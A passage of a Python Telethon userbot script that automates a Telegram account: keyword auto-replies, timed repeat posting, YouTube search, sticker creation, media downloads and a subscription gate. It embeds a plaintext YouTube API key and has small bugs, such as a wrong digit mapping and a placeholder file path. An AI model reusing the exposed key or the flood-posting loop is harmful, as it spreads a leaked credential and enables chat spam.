            if photo_path:
                await event.reply("**‚éâ‚ïéÿ™ŸÖ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ±ÿØ ŸÖÿπ ÿßŸÑÿµŸàÿ±ÿ© .. ÿ®ŸÜÿ¨ŸÄÿßÿ≠ ‚òëÔ∏è.**")
            else:
                await event.reply("**‚éâ‚ïéÿ™ŸÖ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ±ÿØ ÿ®ÿØŸàŸÜ ÿµŸàÿ±ÿ© .. ÿ®ŸÜÿ¨ŸÄÿßÿ≠ ‚òëÔ∏è.**")
        else:
            await event.reply("**‚éô Ÿäÿ¨ÿ® ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿµŸäÿ∫ÿ© ÿßŸÑÿµÿ≠Ÿäÿ≠ÿ©: ÿ±ÿØ ÿßŸÑÿ±ÿØ**")

    except Exception as e:
        await event.reply(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(e)}")


@client.on(events.NewMessage(incoming=True))
async def respond_to_message(event):
    try:
        
        if event.is_private:
            user_id = event.sender_id
            current_time = datetime.now()

            
            last_message_time_sent = user_last_message_time_sent.get(user_id, datetime.now() - timedelta(minutes=5))
            last_message_id = user_last_message_id.get(user_id)

            
            if (current_time - last_message_time_sent).total_seconds() >= 240:
                response_data = responses.get('response', {})
                keyword_response = response_data.get('response')
                photo_path = response_data.get('photo')

                if keyword_response:
                    
                    if last_message_id:
                        try:
                            await client.delete_messages(event.chat_id, last_message_id)
                        except Exception as e:
                            print(f"")

                    
                    if photo_path and os.path.exists(photo_path):
                        message = await event.respond(keyword_response, file=photo_path)
                    else:
                        message = await event.respond(keyword_response)
                    
                    
                    user_last_message_id[user_id] = message.id

                else:
                    await event.respond("")
                
                
                user_last_message_time_sent[user_id] = current_time
                with open('path_to_last_message_sent_time_file', 'wb') as f:
                    pickle.dump(user_last_message_time_sent, f)

            
            user_last_message_time[user_id] = current_time
            with open(last_message_time_file, 'wb') as f:
                pickle.dump(user_last_message_time, f)

            
            with open(last_message_id_file, 'wb') as f:
                pickle.dump(user_last_message_id, f)

    except Exception as e:
        print(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©: {str(e)}")


@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸáŸÑÿßŸàŸÖ.'))
async def add_response(event):
    await event.delete()
    try:
        photo_path = None

        
        if event.reply_to_msg_id:
            
            replied_message = await client.get_messages(event.chat_id, ids=event.reply_to_msg_id)
            
            
            if replied_message.photo:
                
                photo_path = os.path.join(image_folder, f"{event.reply_to_msg_id}.jpg")
                await client.download_media(replied_message, file=photo_path)

        
        if ' ' in event.raw_text:
            _, args = event.raw_text.split(' ', 1)
            if '(' in args and ')' in args:
                keyword, response = args.split('(', 1)[1].split(')', 1)
                keyword = keyword.strip().lower()
                response = response.strip()

                
                responses[keyword] = {
                    'response': response,
                    'photo': photo_path
                }
                
                
                with open(response_file, 'wb') as f:
                    pickle.dump(responses, f)
                
                if photo_path:
                    await event.reply("**‚éâ‚ïéÿ™ŸÖ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ±ÿØ ŸÖÿπ ÿßŸÑÿµŸàÿ±ÿ© .. ÿ®ŸÜÿ¨ŸÄÿßÿ≠ ‚òëÔ∏è.**")
                else:
                    await event.reply("**‚éâ‚ïéÿ™ŸÖ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ±ÿØ ÿ®ÿØŸàŸÜ ÿµŸàÿ±ÿ© .. ÿ®ŸÜÿ¨ŸÄÿßÿ≠ ‚òëÔ∏è.**")
            else:
                await event.reply("**‚éô Ÿäÿ¨ÿ® ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿµŸäÿ∫ÿ© ÿßŸÑÿµÿ≠Ÿäÿ≠ÿ©: .add (ÿßŸÑŸÉŸÑŸÖÿ© ÿßŸÑŸÖŸÅÿ™ÿßÿ≠Ÿäÿ©) ÿßŸÑÿ±ÿØ.**")
        else:
            await event.reply("**‚éô Ÿäÿ¨ÿ® ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿµŸäÿ∫ÿ© ÿßŸÑÿµÿ≠Ÿäÿ≠ÿ©: .add (ÿßŸÑŸÉŸÑŸÖÿ© ÿßŸÑŸÖŸÅÿ™ÿßÿ≠Ÿäÿ©) ÿßŸÑÿ±ÿØ.**")

    except Exception as e:
        await event.reply(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(e)}")


@client.on(events.NewMessage(from_users='me', pattern='.##Ÿ®'))
async def show_responses(event):
    await event.delete()
    try:
        if responses:
            message = "‚éô ÿßŸÑÿ±ÿØŸàÿØ ÿßŸÑŸÖÿ∂ÿßŸÅÿ©:\n"
            for keyword, data in responses.items():
                photo_status = "ŸÖÿ∂ÿßŸÅÿ© ÿ•ŸÑŸäŸá ÿµŸàÿ±ÿ©" if data['photo'] else "ÿ∫Ÿäÿ± ŸÖÿ∂ÿßŸÅÿ© ÿ•ŸÑŸäŸá ÿµŸàÿ±ÿ©"
                message += f"üîπ ÿßŸÑŸÉŸÑŸÖÿ© ÿßŸÑŸÖŸÅÿ™ÿßÿ≠Ÿäÿ©: {keyword}\nüî∏ ÿßŸÑÿ±ÿØ: {data['response']} ({photo_status})\n"
            await event.reply(message)
        else:
            await event.reply("**‚éô ŸÑÿß ÿ™Ÿàÿ¨ÿØ ÿ±ÿØŸàÿØ ŸÖÿ∂ÿßŸÅÿ© ÿ≠ÿ™Ÿâ ÿßŸÑÿ¢ŸÜ.**")
    except Exception as e:
        await event.reply(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(e)}")


@client.on(events.NewMessage(incoming=True))
async def respond_to_greeting(event):
        message_text = event.raw_text.lower()
        for keyword, data in responses.items():
            if keyword in message_text:
                try:
                    if data['photo']:
                        await client.send_file(event.chat_id, file=data['photo'], caption=data['response'])
                    else:
                        await event.reply(data['response'])
                except Exception as e:
                    await event.reply(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(e)}")
                break

async def respond_to_mention(event):
        sender = await event.get_sender()
        await event.reply(f"ÿßŸÜÿ™ÿ∏ÿ± Ÿäÿ¨Ÿä ÿßŸÑŸÖÿ∑Ÿàÿ± @{sender.username} ŸàŸäÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ™ŸÉ ŸÑÿß ÿ™ÿ®ŸÇŸá ÿ™ŸÖŸÜÿ¥ŸÜŸá ŸáŸàÿßŸä")
client.add_event_handler(respond_to_mention, events.NewMessage(incoming=True, pattern=f'(?i)@{client.get_me().username}'))

def superscript_time(time_str):
    superscript_digits = str.maketrans('0123456789', 'ùü¨ùü≠ùüÆùüØùü∞ùü±ùü≤ùü≠ùü¥ùüµ')
    return time_str.translate(superscript_digits)

async def get_account_name():
    me = await client.get_me()
    return re.sub(r' - \d{2}:\d{2}', '', me.first_name)

async def update_username():
    global account_name
    iraq_tz = pytz.timezone('Asia/Baghdad')

    
    if account_name is None:
        account_name = await get_account_name()

    while True:
        now = datetime.now(iraq_tz)
        current_time = superscript_time(now.strftime("%I:%M"))

        
        current_name = await get_account_name()
        if current_name != account_name:
            account_name = current_name  

        
        if time_update_status.get('enabled', False):
            new_username = f"{account_name} - {current_time}"
        else:
            new_username = f"{account_name}"

        try:
            
            await client(UpdateProfileRequest(first_name=new_username))
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)
        except Exception as e:
            print(f"Error updating username: {e}")
        
        
        seconds_until_next_minute = 60 - now.second
        await asyncio.sleep(seconds_until_next_minute)


base_images_dir = os.path.join(os.getcwd(), 'images')

@client.on(events.NewMessage(from_users='me', pattern=r'.ÿ™ŸÉÿ±ÿßÿ± (\d+) (\d+) ?([\s\S]*)'))
@client.on(events.NewMessage(from_users='me', pattern=r'.ÿ™ŸÉ (\d+) (\d+) ?([\s\S]*)'))
@client.on(events.NewMessage(from_users='me', pattern=r'.ŸÜÿ¥ÿ± (\d+) (\d+) ?([\s\S]*)'))
async def start_repeating_process(event):
    await event.delete()
    try:
        seconds = int(event.pattern_match.group(1))
        repeat_count = int(event.pattern_match.group(2))
        custom_text = event.pattern_match.group(3)
        
        
        if seconds < 40:
            await event.reply("**‚éô Ÿäÿ¨ÿ® ÿ£ŸÜ ŸäŸÉŸàŸÜ ÿßŸÑŸàŸÇÿ™ ÿßŸÑŸÖÿ≠ÿØÿØ ŸÑÿß ŸäŸÇŸÑ ÿπŸÜ 40 ÿ´ÿßŸÜŸäÿ©.**")
            return

        process_images_dir = None
        media_files = []

        if event.is_reply:
            message = await event.get_reply_message()
            
            
            process_id = int(time.time())  
            process_images_dir = os.path.join(base_images_dir, str(process_id))
            os.makedirs(process_images_dir)

            
            if message.media:
                if message.grouped_id:  
                    messages = await client.get_messages(event.chat_id, min_id=message.id - 10, max_id=message.id + 10)
                    for msg in messages:
                        if msg.grouped_id == message.grouped_id and msg.photo:
                            file_path = os.path.join(process_images_dir, f"image_{msg.id}.jpg")
                            await msg.download_media(file=file_path)
                            media_files.append(file_path)
                else:
                    if message.photo:
                        file_path = os.path.join(process_images_dir, f"image_{message.id}.jpg")
                        await message.download_media(file=file_path)
                        media_files.append(file_path)

            if not media_files and not custom_text:
                await event.reply("**‚éô Ÿäÿ¨ÿ® ÿ™ÿ≠ÿØŸäÿØ ŸÜÿµ ŸÖÿÆÿµÿµ ÿ£Ÿà ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿµŸàÿ±ÿ©.**")
                return

        async def task():
            for i in range(repeat_count):
                if media_files:
                    await client.send_file(event.chat_id, media_files, caption=custom_text)
                else:
                    await client.send_message(event.chat_id, custom_text)
                
                await asyncio.sleep(seconds)
            
            
            if process_images_dir and os.path.exists(process_images_dir):
                shutil.rmtree(process_images_dir)
            
            active_publishing_tasks.pop(event.chat_id, None)

        task = asyncio.create_task(task())
        
        
        if event.chat_id not in active_publishing_tasks:
            active_publishing_tasks[event.chat_id] = []
        active_publishing_tasks[event.chat_id].append((task, process_images_dir))
        
        
        await asyncio.sleep(2)
        confirmation_message = await event.reply(f"ÿ≥Ÿäÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ŸÉŸÑ {seconds} ÿ´ÿßŸÜŸäÿ© ŸÑŸÄ {repeat_count} ŸÖÿ±ÿßÿ™.")

        
        await asyncio.sleep(1)
        await event.delete()
        await confirmation_message.delete()

    except Exception as e:
        await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}")

@client.on(events.NewMessage(from_users='me', pattern=r'.ÿßŸäŸÇÿßŸÅ ÿßŸÑŸÜÿ¥ÿ± ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä'))
async def stop_sending(event):
    await event.delete()
    try:
        if event.chat_id in active_publishing_tasks:
            for task, process_images_dir in active_publishing_tasks[event.chat_id]:
                task.cancel()
                
                if process_images_dir and os.path.exists(process_images_dir):
                    shutil.rmtree(process_images_dir)
            
            del active_publishing_tasks[event.chat_id]

            
            confirmation_message = await event.reply("   ‚Äå‚Äé‚úì ÿ™ŸÖ ÿ•ŸäŸÇÿßŸÅ ÿ¨ŸÖŸäÿπ ÿπŸÖŸÑŸäÿßÿ™ ÿßŸÑŸÜÿ¥ÿ± ÿßŸÑŸÖŸÅÿπŸÑŸá   ‚Äå‚Äé‚éô.")
            
            
            await asyncio.sleep(1)
            await event.delete()
            
            
            await asyncio.sleep(3)
            await confirmation_message.delete()

        else:
            await event.reply("   ‚Äå‚Äé‚éô ŸÑÿß ÿ™Ÿàÿ¨ÿØ ÿπŸÖŸÑŸäÿßÿ™ ŸÜÿ¥ÿ± ŸÅÿπŸëÿßŸÑÿ© ŸÑÿ•ŸäŸÇÿßŸÅŸáÿß.")
    except Exception as e:
        await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}")


YOUTUBE_API_KEY = 'AIzaSyBfb8a-Ug_YQFrpWKeTc88zuI6PmHVdzV0'
YOUTUBE_API_URL = 'https://www.googleapis.com/youtube/v3/search'

@client.on(events.NewMessage(from_users='me', pattern=r'.ŸäŸàÿ™ŸäŸàÿ® (.+)'))
async def youtube_search(event):
    await event.delete()
    query = event.pattern_match.group(1)
    
    async with aiohttp.ClientSession() as session:
        async with session.get(YOUTUBE_API_URL, params={
            'part': 'snippet',
            'q': query,
            'key': YOUTUBE_API_KEY,
            'type': 'video',
            'maxResults': 1
        }) as response:
            data = await response.json()
            if data['items']:
                video_id = data['items'][0]['id']['videoId']
                video_url = f"https://www.youtube.com/watch?v={video_id}"
                await event.reply(f"üìπ ŸáŸÜÿß ÿ±ÿßÿ®ÿ∑ ÿßŸÑŸÅŸäÿØŸäŸà ÿßŸÑÿ∞Ÿä ÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸäŸá:\n{video_url}")
            else:
                await event.reply("‚éô ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ŸÅŸäÿØŸäŸà Ÿäÿ™ÿ∑ÿßÿ®ŸÇ ŸÖÿπ ÿßŸÑÿπŸÜŸàÿßŸÜ ÿßŸÑŸÖÿ∑ŸÑŸàÿ®.")
                
STICKER_BOT = "@Stickers"
KANGING_STR = [
    "‚™º ÿ¨ÿßÿ±Ÿä ÿµŸÜÿπ ÿßŸÑŸÖŸÑÿµŸÇ...",
    "‚™º ÿ¨ÿßÿ±Ÿä ÿßŸÑÿ™ÿπÿØŸäŸÑ ÿπŸÑŸâ ÿßŸÑŸÖŸÑÿµŸÇ...",
    "‚™º ÿ¨ÿßÿ±Ÿä ÿ≠ŸÅÿ∏ ÿßŸÑŸÖŸÑÿµŸÇ ÿ®ÿ≠ŸÇŸàŸÇŸÉ..."
]

@client.on(events.NewMessage(pattern=r'\.ŸÖŸÑÿµŸÇ(?:\s|$)([\s\S]*)'))
async def create_sticker(event):
    """ŸÑÿµŸÜÿπ ŸÖŸÑÿµŸÇ ŸÖŸÜ ÿµŸàÿ±ÿ© ÿ£Ÿà ŸÖŸÑÿµŸÇ ÿ¢ÿÆÿ±"""
    try:
        reply = await event.get_reply_message()
        if not reply or not reply.media:
            await event.edit("‚™º ÿ®ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿµŸàÿ±ÿ© ÿ£Ÿà ŸÖŸÑÿµŸÇ")
            return

        await event.edit(random.choice(KANGING_STR))
        
        # ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑŸÖŸäÿØŸäÿß
        if isinstance(reply.media, MessageMediaPhoto):
            photo = io.BytesIO()
            photo = await client.download_media(reply.photo, photo)
        elif reply.document and 'image' in reply.document.mime_type:
            photo = io.BytesIO()
            await client.download_media(reply.document, photo)
        else:
            await event.edit("‚™º ŸÜŸàÿπ ÿßŸÑŸÖŸÑŸÅ ÿ∫Ÿäÿ± ŸÖÿØÿπŸàŸÖ")
            return

        # ÿ™ÿ∫ŸäŸäÿ± ÿ≠ÿ¨ŸÖ ÿßŸÑÿµŸàÿ±ÿ©
        image = Image.open(photo)
        image.thumbnail((512, 512))
        output = io.BytesIO()
        output.name = "sticker.webp"
        image.save(output, "WEBP")
        output.seek(0)

        # ÿ•ÿ±ÿ≥ÿßŸÑ ŸÑŸÑŸÖŸÑÿµŸÇÿßÿ™
        async with client.conversation(STICKER_BOT) as conv:
            try:
                await conv.send_message('/newpack')
            except YouBlockedUserError:
                await client(unblock(STICKER_BOT))
                await conv.send_message('/newpack')
            
            await conv.get_response()
            await conv.send_message("ÿ≠ÿ≤ŸÖÿ© ÿ¨ÿØŸäÿØÿ©")
            await conv.get_response()
            await client.send_file(conv.chat_id, output)
            await conv.get_response()
            await conv.send_message('üòÇ')  # ÿ•ŸäŸÖŸàÿ¨Ÿä ÿßŸÅÿ™ÿ±ÿßÿ∂Ÿä
            await conv.get_response()
            await conv.send_message('/publish')
            await conv.get_response()
            await conv.send_message('/skip')
            await conv.get_response()
            await conv.send_message("ÿßÿ≥ŸÖ ÿßŸÑÿ≠ÿ≤ŸÖÿ©")
            await conv.get_response()

        await event.edit("‚úì ÿ™ŸÖ ÿ•ŸÜÿ¥ÿßÿ° ÿßŸÑŸÖŸÑÿµŸÇ ÿ®ŸÜÿ¨ÿßÿ≠!")

    except Exception as e:
        await event.edit(f"‚™º ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(e)}")

@client.on(events.NewMessage(pattern=r'\.ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑŸÖŸÑÿµŸÇ$'))
async def sticker_info(event):
    """ŸÑÿπÿ±ÿ∂ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑŸÖŸÑÿµŸÇ"""
    try:
        reply = await event.get_reply_message()
        if not reply or not reply.sticker:
            await event.edit("‚™º ÿ®ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ŸÖŸÑÿµŸÇ")
            return

        stickerset = await client(GetStickerSetRequest(
            InputStickerSetID(
                id=reply.sticker.id,
                access_hash=reply.sticker.access_hash
            )
        ))

        await event.edit(
            f"ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑŸÖŸÑÿµŸÇ:\n"
            f"- ÿßÿ≥ŸÖ ÿßŸÑÿ≠ÿ≤ŸÖÿ©: {stickerset.set.title}\n"
            f"- ÿßŸÑÿ±ÿßÿ®ÿ∑: t.me/addstickers/{stickerset.set.short_name}\n"
            f"- ÿπÿØÿØ ÿßŸÑŸÖŸÑÿµŸÇÿßÿ™: {stickerset.set.count}\n"
            f"- ÿßŸÑÿ•ŸäŸÖŸàÿ¨Ÿä: {reply.sticker.emoji or '‚ùå'}"
        )

    except Exception as e:
        await event.edit(f"‚™º ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(e)}")                

@client.on(events.NewMessage(from_users='me', pattern=r'.ŸäŸàÿ™(?: |$)(.*)'))
async def download_media(event):
    await event.delete()
    search_query = event.pattern_match.group(1).strip()
    
    if not search_query:
        await event.reply("‚éô Ÿäÿ±ÿ¨Ÿâ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßÿ≥ŸÖ ÿßŸÑŸÖŸÇÿ∑ÿπ ÿßŸÑŸÖÿ∑ŸÑŸàÿ® ÿ®ÿπÿØ ÿßŸÑÿ£ŸÖÿ± .ÿ™ÿ≠ŸÖŸäŸÑ")
        return
    
    try:
        async with aiohttp.ClientSession() as session:
            # ÿßŸÑÿ®ÿ≠ÿ´ ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑŸÉŸÑŸÖÿßÿ™ ÿßŸÑŸÖŸÅÿ™ÿßÿ≠Ÿäÿ©
            api_url = 'http://145.223.80.56:5001/get'
            params = {'q': search_query}
            
            async with session.get(api_url, params=params) as response:
                if response.status == 200:
                    data = await response.json()
                    audio_url = data.get("ÿ±ÿßÿ®ÿ∑ ÿßŸÑÿµŸàÿ™") or data.get("\u0631\u0627\u0628\u0637 \u0627\u0644\u0635\u0648\u062a")
                    video_url = data.get("ÿ±ÿßÿ®ÿ∑ ÿßŸÑŸÅŸäÿØŸäŸà") or data.get("\u0631\u0627\u0628\u0637 \u0627\u0644\u0641\u064a\u062f\u064a\u0648")
                    
                    if not (audio_url or video_url):
                        await event.reply("‚éô ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ŸÜÿ™ÿßÿ¶ÿ¨ ŸÑŸÑÿ®ÿ≠ÿ´ ÿßŸÑŸÖÿ∑ŸÑŸàÿ®")
                        return
                    
                    # ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑŸÅŸäÿØŸäŸà ÿ•ÿ∞ÿß ŸÖŸàÿ¨ŸàÿØ
                    if video_url:
                        try:
                            await event.reply("‚è≥ ÿ¨ÿßÿ±Ÿä ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑŸÅŸäÿØŸäŸà...")
                            async with session.get(video_url) as vid_resp:
                                if vid_resp.status == 200:
                                    video_data = await vid_resp.read()
                                    with open('temp_video.mp4', 'wb') as f:
                                        f.write(video_data)
                                    
                                    await event.reply(
                                        file='temp_video.mp4',
                                        message=f"üé¨ ÿ™ŸÖ ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑŸÅŸäÿØŸäŸà: {search_query}",
                                        buttons=[
                                            [Button.inline('ÿ≠ÿ∞ŸÅ', b'delete_msg')]
                                        ]
                                    )
                                    os.remove('temp_video.mp4')
                                else:
                                    await event.reply("‚éô ŸÅÿ¥ŸÑ ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑŸÅŸäÿØŸäŸà")
                        except Exception as vid_e:
                            await event.reply(f"‚éô ÿÆÿ∑ÿ£ ŸÅŸä ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑŸÅŸäÿØŸäŸà: {str(vid_e)}")
                    
                    # ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ™ ÿ•ÿ∞ÿß ŸÖŸàÿ¨ŸàÿØ
                    if audio_url:
                        try:
                            await event.reply("‚è≥ ÿ¨ÿßÿ±Ÿä ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿµŸàÿ™...")
                            async with session.get(audio_url) as aud_resp:
                                if aud_resp.status == 200:
                                    audio_data = await aud_resp.read()
                                    with open('temp_audio.mp3', 'wb') as f:
                                        f.write(audio_data)
                                    
                                    await event.reply(
                                        file='temp_audio.mp3',
                                        message=f"üéµ ÿ™ŸÖ ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿµŸàÿ™: {search_query}",
                                        buttons=[
                                            [Button.inline('ÿ≠ÿ∞ŸÅ', b'delete_msg')]
                                        ]
                                    )
                                    os.remove('temp_audio.mp3')
                                else:
                                    await event.reply("‚éô ŸÅÿ¥ŸÑ ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿµŸàÿ™")
                        except Exception as aud_e:
                            await event.reply(f"‚éô ÿÆÿ∑ÿ£ ŸÅŸä ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿµŸàÿ™: {str(aud_e)}")
                    
                else:
                    error_msg = await response.text()
                    await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿÆÿßÿØŸÖ: {error_msg}")
    
    except Exception as e:
        await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ŸÖÿ≠ÿßŸàŸÑÿ© ÿßŸÑÿ™ŸÜÿ≤ŸäŸÑ: {str(e)}")


@client.on(events.CallbackQuery(data=b'delete_msg'))
async def delete_message(event):
    await event.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ÿ™ŸÅÿπŸäŸÑ ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑŸàŸÇÿ™Ÿä'))
async def enable_time_update(event):
    await event.delete()
    global time_update_status
    time_update_status['enabled'] = True
    with open(time_update_status_file, 'wb') as f:
        pickle.dump(time_update_status, f)
    reply = await event.reply("‚úì ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿßŸÑÿßÿ≥ŸÖ ŸÖÿπ ÿßŸÑŸàŸÇÿ™   ‚Äå‚Äé‚éô.")
    await event.delete()  

    await asyncio.sleep(1)
    await reply.delete()  

@client.on(events.NewMessage(from_users='me', pattern='.ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑŸàŸÇÿ™Ÿä'))
async def disable_time_update(event):
    await event.delete()
    global time_update_status
    time_update_status['enabled'] = False
    with open(time_update_status_file, 'wb') as f:
        pickle.dump(time_update_status, f)
    
    
    if account_name:
        iraq_tz = pytz.timezone('Africa/Algeria')
        now = datetime.now(iraq_tz)
        current_name = re.sub(r' - \d{2}:\d{2}', '', account_name)
        new_username = f"{current_name}"
        
        try:
            await client(UpdateProfileRequest(first_name=new_username))
            reply = await event.reply("‚úì ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÑÿßÿ≥ŸÖ Ÿàÿ•ÿ≤ÿßŸÑÿ© ÿßŸÑŸàŸÇÿ™ ŸÖŸÜ ÿßŸÑÿßÿ≥ŸÖ   ‚Äå‚Äé‚éô.")
        except Exception as e:
            reply = await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ•ÿ≤ÿßŸÑÿ© ÿßŸÑŸàŸÇÿ™ ŸÖŸÜ ÿßŸÑÿßÿ≥ŸÖ: {e}")
    else:
        reply = await event.reply("‚éô ŸÑŸÖ Ÿäÿ™ŸÖ ÿ™ÿπŸäŸäŸÜ ÿßÿ≥ŸÖ ÿßŸÑÿ≠ÿ≥ÿßÿ®.")
    
    await event.delete()  

    await asyncio.sleep(1)
    await reply.delete()  

@client.on(events.NewMessage(from_users='me', pattern='.ÿßÿ∂ÿßŸÅÿ© ŸÇŸÜÿßÿ© ÿßÿ¥ÿ™ÿ±ÿßŸÉ (.+)'))
async def add_channel(event):
    await event.delete()
    global channel_link
    channel_link = event.pattern_match.group(1)
    with open(channel_link_file, 'wb') as f:
        pickle.dump(channel_link, f)
    await event.reply(f"   ‚Äå‚Äé‚éô ÿ™ŸÖ ÿ™ÿπŸäŸäŸÜ ÿ±ÿßÿ®ÿ∑ ÿßŸÑŸÇŸÜÿßÿ© ÿ•ŸÑŸâ: {channel_link}")
    await event.delete()  

@client.on(events.NewMessage(from_users='me', pattern= '.ŸÖÿ≥ÿ≠ ÿßŸÑŸÇŸÜÿßÿ©' ))
async def remove_channel(event):
    await event.delete()
    global channel_link
    channel_link = ''
    with open(channel_link_file, 'wb') as f:
        pickle.dump(channel_link, f)
    reply = await event.reply("‚éô ÿ™ŸÖ ŸÖÿ≥ÿ≠ ÿ±ÿßÿ®ÿ∑ ÿßŸÑŸÇŸÜÿßÿ©.")
    await event.delete()  
    await asyncio.sleep(3)
    await reply.delete()  

async def is_subscribed(user_id):
    if not channel_link:
        return True  
    channel_username = re.sub(r'https://t.me/', '', channel_link)
    try:
        offset = 0
        limit = 100
        while True:
            participants = await client(GetParticipantsRequest(
                channel=channel_username,
                filter=ChannelParticipantsSearch(''),
                offset=offset,
                limit=limit,
                hash=0
            ))
            if not participants.users:
                break
            for user in participants.users:
                if user.id == user_id:
                    return True
            offset += len(participants.users)
        return False
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
        return await is_subscribed(user_id)
    except Exception as e:
        print(f"Error checking subscription: {e}")
        return False

@client.on(events.NewMessage(incoming=True))
async def respond_to_greeting(event):
        sender = await event.get_sender()
        if sender.phone == '42777':
            
            return
        if not await is_subscribed(event.sender_id):
            await event.reply(f"ŸÑÿß ŸäŸÖŸÉŸÜŸÉ ŸÖÿ±ÿßÿ≥ŸÑÿ™Ÿä ÿßŸÑŸâ ÿ®ÿπÿØ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ŸÅŸä ŸÇŸÜÿßÿ™Ÿä: {channel_link}")
            await client.delete_messages(event.chat_id, [event.id])
        else:
            message_text = event.raw_text.lower()

@client.on(events.NewMessage(from_users='me', pattern='...ŸÜŸÜ..'))
async def delete_message(event):
    await event.delete()
    
    await asyncio.sleep(2)
    await event.delete()
    
    try:
        
        command, keyword = event.raw_text.split(' ', 1)
        keyword = keyword.lower()
        
        if keyword in responses:
            del responses[keyword]
            
            with open(response_file, 'wb') as f:
                pickle.dump(responses, f)
            
            
            confirmation_message = await event.reply("‚úì ÿ™ŸÖ ÿ≠ÿ∞ŸÅ ÿßŸÑÿ±ÿØ   ‚Äå‚Äé‚éô")
            
            
            await asyncio.sleep(2)
            await confirmation_message.delete()
        else:
            warning_message = await event.reply("‚éô ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿßŸÑŸÉŸÑŸÖÿ© ÿßŸÑŸÖÿ≠ÿØÿØÿ©")
            
            
            await asyncio.sleep(2)
            await warning_message.delete()
    
    
    except ValueError:
        error_message = await event.reply("‚éô ÿßÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿµŸäÿ∫ÿ©: del ÿßŸÑŸÉŸÑŸÖÿ© ÿßŸÑŸÖŸÅÿ™ÿßÿ≠Ÿäÿ©")
        
        
        await asyncio.sleep(2)
        await error_message.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ÿπÿØÿßÿØ'))
async def countdown_timer(event):
    await event.delete()
    try:
        
        command, args = event.raw_text.split(' ', 1)
        minutes = int(args.strip().strip('()'))

        
        if event.chat_id in active_timers:
            active_timers[event.chat_id].cancel()
            del active_timers[event.chat_id]
            
            if event.chat_id in countdown_messages:
                await client.delete_messages(event.chat_id, countdown_messages[event.chat_id])
                del countdown_messages[event.chat_id]

        async def timer_task():
            nonlocal minutes
            total_seconds = minutes * 60
            
            countdown_message = await event.reply("**   ‚Äå‚Äé‚éô ÿ≥Ÿäÿ®ÿØÿ£ ÿßŸÑÿπÿØ ÿßŸÑÿ™ŸÜÿßÿ≤ŸÑŸä ÿ®ÿπÿØ 3 **")

            
            countdown_messages[event.chat_id] = countdown_message.id

            
            await asyncio.sleep(1)
